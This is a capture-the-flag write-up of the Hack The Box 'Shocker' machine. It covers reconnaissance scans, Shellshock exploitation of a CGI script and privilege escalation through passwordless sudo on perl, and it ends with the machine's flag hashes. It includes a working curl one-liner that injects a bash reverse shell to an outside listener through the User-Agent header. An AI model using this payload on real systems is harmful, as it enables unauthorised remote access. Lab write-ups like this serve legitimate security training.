---
layout: post
title:  "HTB Shocker Linux"
description : 
tags: 
---

# Recon
Nmap scan
```ruby
CVEs_10.10.10.56.nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.020s latency).
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| vulners:
| cpe:/a:apache:http_server:2.4.18:
| CVE-2017-7679 7.5 https://vulners.com/cve/CVE-2017-7679
| CVE-2017-7668 7.5 https://vulners.com/cve/CVE-2017-7668
| CVE-2017-3169 7.5 https://vulners.com/cve/CVE-2017-3169
| CVE-2017-3167 7.5 https://vulners.com/cve/CVE-2017-3167
|_ CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Dirbuster scan
```ruby
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: /cgi-bin/ - 403
Dir found: / - 200
Dir found: /icons/ - 403
```
Gobuster scan
```ruby
gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://
10.10.10.56:80/cgi-bin -s 200,204,301,302,307,403 -x sh
/user.sh (Status: 200)
```
```ruby
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2019-11-04 16:30:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8673 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2019-11-04 16:34:28 (GMT-5) (234 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Exploitation Shellshock
The target machine is vulnerable to RCI Shellshock
After a little bit of research I came accross with a nice and handy one-liner reverse shell to
get user.
```ruby
curl -H "User-Agent:() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.25/5555 0>&1" http://
10.10.10.56/cgi-bin/user.sh
```
![](https://lh3.googleusercontent.com/ik9ZmyziiHaJQlxfDZGn9lLlvJzFAlovugfope5AwtAnjxomtRIdr3G0t5Bvllf7F7Af3RR4VzJYFcjZFMSjt2bj6e06dhxq0DH5hjc7k-ebnc02igvtVhpEKOmlE5DbgzL9-xNMpft3UhmFg5FtWmIVY-EzyHhPWtI_4Fzq4ISTd4Lyen3dE3OSDDkYWspQbBHmFUjcbTrMrKrgGIsIQ1YonNYVFFUN8f3g3LjMBYRArmHzp0wkyHuWIt-VvLTWVqgFyH1GVtUN3F1vROrBuP8Amh1Vtx4MNd2-u5BPjeiJv_7_zl633_sotZAk6WpDpgetuSmQ52Lr0tXHxBoxcDyUb0i5Oow37bptWc_TCXU9F6FDMZGMCiQYS7HluhX8_r5bGbuxrbQx5nBqPuOkhjsQriV44aZ2sAPcpHBSEm2z2zSwie3dx0ELugmjwC7FXP157mFxGaYlQDN3_Rfpt3fkCSRyshipW9tIas0FR7g40a-ZoyOoQtai8E0rfuHR52b7k05VuLv4dg_PNBiYY_FdYkfDHMHRxw2OZCFvYJZBMo0D0MwJWAzQsKZHMd7eVaE8D3VHqJKyB673TiMOWJuJCRLxlg69pkEp4Ub0NrK8TIFEvB5HwRqmbgcGMr9IaeaoEMIzsQl4nnqe_K6T4HHQAPT8xENk6duXSdZxwwrgzJ51JTb6opA=w703-h195-no)

# Privilege Escalation
After running LinuxEnum script we find out that we can **sudo** perl files
```ruby
[+] We can sudo without supplying a password!
Matching Defaults entries for shelly on Shocker:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/
bin\:/sbin\:/bin\:/snap/bin
User shelly may run the following commands on Shocker:
 (root) NOPASSWD: /usr/bin/perl
[+] Possible sudo pwnage!
/usr/bin/perl
```
![](https://lh3.googleusercontent.com/pqAM_KlDJqm8bgU7z8Pt73Xrp4qkQteltjrVt2O7v-7I5vvjf5oJDhLT-PKasb4kvHMoRFRsG4p_sL9QTrfJSFGjDn2FJhNhUsxsKWLkVGtl5GR-F4Lzz3U3xBs09r0lXNqFhnNRsGyNrs-UQ6iLeIRObO_uCCzgTsdcODzUgPna1XgvXDq6cdJKFvt-cEMfOTXBwrDtaQYt_sicxhHMFTO9ONmgBvxzPq2S4DZCllb9hiZVmF4FrxWGvIxoduL589mnyHYsCo9dVe5LqaC9tv5eZGsJIQVZgGpBeOE0kGOn5PHqrN4LELyr3r1PI6eIXjvBu4ATpwtmZt2Vve9Op3dw0M4UIF5WBy5pSnQ4bcEAacrH10bYpCIGx8gJmai6AUeqsVP8mcnG8p5cPkQ8QNiN6491urNRchk8yGkxzHjwSrL173ph8LIZg7BIq9DsyUnEU7lYaYe9oYsIa4uyE9IN_AM6dthFQBi2qZ97xGQpu4CXyP7uZWwvRBgOOYBUsgNFleLb-Ip2i_nLVDEIme_psMe377PcLliSGYOf3AlEzVrozvXz0UdxhtJqy04om9UTSTPgHEifdd5UM7p8JITjlFdTBFYb7uPBG7Rx3ZqVboqiiUhTqW5oieswrrilppFR3aSe8M06QM5hzmRBR5iv4IgfHDTgs1ErwZDDpqNai5kJ1EKnLpY=w751-h222-no)

We upload a perl reverse shell and set up nectat to get root!
![](https://lh3.googleusercontent.com/aMsxhqanjduBrkVsZrjxG_0zsePClu_pk2Yobd7mxPA_ZR9O3xymsAvPk0Efmr2ORqDdAlKo9YLcWtWrvOy-CJ4LaI4UDFe_oQswKcIlwzEo2nZ3XaPS9fa0fwm9vBzFQg0nKEHFcJpM5ai-aTDLn7ZFRWSCIEPtI_Nu561GTb2G5kPomyLK0kkWGIk0uWGXGb0QisUv8mYvTaulEo51XDp1vn5wEq8osUOryOiXO8KS0aikRBSsDsin7LZywffZWwgD3LHRgha5ANGO4K5MidZDhFICor67aMVaxrNyFYcVT_B92VJIOQDWDOdHV3lRhkO3s79swVAbbbGEunt8UL6_52GpSXqIL6wPMnz60gjN4xF6CKZw8CumAavdiuALvp_9NEeswQjtXeA0BOStXZNtKyDBipTScX6uMy5lsklfZxFl52I-jhb1EOla-ZZU9uHd1fz89cYIa0UHLOUx5XjiLBPgdRBEKWchmuCq6JvD5C2OnCx-l0YIh0bZqZJ2IaVoEsVaZlcANOgM51HSnbNLHRWp5Y-luZYjHImNR_j4LpBKEh2aF_xIB1bHpwJRh4_VS0upR-NbqXAm_Ef30M5LHTJfzEjgv3212tlotQZc-hy5aDLk9FHzUTXkeYsFCslB10f-5L02q3eavmREu5Umun4fpfFgmszONki6S6q-SZuUJElus6k=w611-h451-no)

![](https://lh3.googleusercontent.com/a3UnJ2fxz4uqeetF8rGEcviQ6010kl8eJ6F_tGsM4Hf-Ob3b7Hf-RJ4awyj7MkfmOiHLeQyLDK7YUL_oLEh7ufghR_LF2bEl-ZXOz0KK9YIlKyiPjBiLaZQi8-1hugMthr05VPaP22SmE1WlspEQF7yleluaf1B0JI4oKQ1xa9Dzr_oFiVTBt0-DSFyzFKzVIJRFMQ1dvFdbVeWit59MtlzZY7GXBQVT311yR-zUmIRcFNvJConvV0jDggqdcpfR5d2sU-L3v42t6lN7GuZVof3XD6WDyqqEEnhZ1p-sKXJOccTFappem0U6hi72ZEucFdzEHZmBcaDuOMtxVHsDqZy91dFi639dxRF-JSvPW1it7iOcy7TYNKkprarmW9--Fypcar90sQJsmdfylb0BJVgTr2ru3-i7xK92a9o4zzc7psvxEmqou8mPPOFWKdiYp6tCD7SPCyWZVv9OlkUSFh8tu4jmxyfc04KJ6Fr4DcJ_5wWf23toJq5P4W5DeLBFnEi8L1zuxwlobaGU-vIJ8j9frfKlaK29xqdZAhAeF5zujSOaYV9ixR601DQKvMroVUmTjLbiLkyCYq_a5PfbcApcJ0-NsrKA2Hxuse7enIJPVW9GhEUqGLG1IAGJqJIN5SJLXU0zHzH87W1GEC-ngEH191AolR_zaf0t5EnAV-pinbvqxk-sK1Q=w809-h277-no)

```ruby
ROOT "52c2715605d70c7619030560dc1ca467"
USER "2ec24e11320026d1e70ff3e16695b233"
```
